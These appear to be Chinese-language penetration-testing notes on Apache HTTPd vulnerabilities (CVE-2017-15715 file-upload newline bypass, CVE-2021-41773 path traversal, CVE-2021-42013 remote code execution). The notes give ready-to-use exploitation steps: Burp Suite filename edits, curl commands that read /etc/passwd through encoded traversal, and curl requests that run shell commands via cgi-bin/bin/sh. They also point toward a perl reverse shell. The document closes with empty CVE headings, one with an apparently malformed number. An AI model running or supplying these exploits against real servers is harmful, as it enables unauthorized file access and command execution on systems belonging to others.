通过 响应包的 server 和 x-powered-by获得apache和php版本

### 文件上传（CVE-2017-15715）

##### 版本：

Apache HTTPd 2.4.0~2.4.29

##### 原理：

此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略

[apache 文件上传 (CVE-2017-15715)漏洞复现_apache2.4.25漏洞-CSDN博客](https://blog.csdn.net/youthbelief/article/details/121258770)

##### 利用：

1.php\x0A将按照PHP后缀进行解析，如果有黑名单看下面

比如要上传文件名为1.php

在bp中先把名字改为1.phpaaaaa。a的hex值为61多写几个 方便寻找

然后再hex表中把第一个61改为0a,然后回来看文件名，此时应该类似于

```
5.php
aaa
```

然后删去多出来的aaa,但要把空行留下。然后再修改一下文件名：6.php。提交

访问上传后的文件，文件名后需要加%0A：

```
http://ip:port/6.php%0A          类似这种
```

此时就可以解析成功

### 路径穿越（CVE-2021-41773）

##### 版本：

- 版本等于2.4.49
- 穿越的目录允许被访问，比如配置了`<Directory />Require all granted</Directory>`。（默认情况下是不允许的

Apache Http Server 2.4.50 未完全修复（CVE-2021-42013）

##### 原理：

[Apache Http Server 路径穿越漏洞复现（CVE-2021-41773） - GoPoux - 博客园](https://www.cnblogs.com/syc233/p/17477732.html)

```
在 Apache HTTP Server 2.4.49 版本中，在对用户发送的请求中的路径参数进行规范化时，其使用的 ap_normalize_path 函数会对路径参数先进行 url 解码，然后判断是否存在 ../ 的路径穿越符。
当检测到路径中存在 % 字符时，若其紧跟的两个字符是十六进制字符，则程序会对其进行 url 解码，将其转换成标准字符，如 %2e 会被转换为 . 。若转换后的标准字符为 . ，此时程序会立即判断其后两字符是否为 ./ ，从而判断是否存在未经允许的 ../ 路径穿越行为。
如果路径中存在 %2e./ 形式，程序就会检测到路径穿越符。然而，当出现 .%2e/ 或 %2e%2e/ 形式，程序就不会将其检测为路径穿越符。原因是遍历到第一个 . 字符时，程序检测到其后两字符为 %2 而不是 ./ ，就不会将其判断为 ../ 。因此，攻击者可以使用 .%2e/ 或 %2e%2e/ 绕过程序对路径穿越符的检测，从而读取位于 Apache 服务器 web 目录以外的其他文件，或者读取 web 目录中的脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。
```

##### 利用

直接攻击机执行命令：

```
curl -v --path-as-is http://目标ip/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

即可成功读取到 `/etc/passwd` 

如果用burpsuite,直接get方式请求（BP中url处直接修改）

/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd【若直接在网站url处修改，会被url编码影响】

### 远程代码执行（CVE-2021-42013）

##### 版本：

Apache Http Server 2.4.50

##### 原理：

看上面那个cve

##### 利用

linux系统执行命令

```
curl -v --data "echo;id" 'http://目标ip/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

即可执行命令id

```
curl -v --data "echo;cd /etc && cat passwd" 
      \ 'http://10.0.2.15:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'

```

即可执行命令`cd /etc && cat passwd`，即访问并查看/etc/passwd

------

或者burpsuite改用post请求提交，在POST下面的第二行加入：

cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

再到数据包下面写上命令

echo;id

- 反弹shell

不能用bash语言，用perl语言写命令

[CVE-2021-41773 目录穿越复现并反弹shell-CSDN博客](https://blog.csdn.net/m0_53073183/article/details/135982730)

### CVE-2017-9798

### CVE-2018-111759

### CVE-2021-37580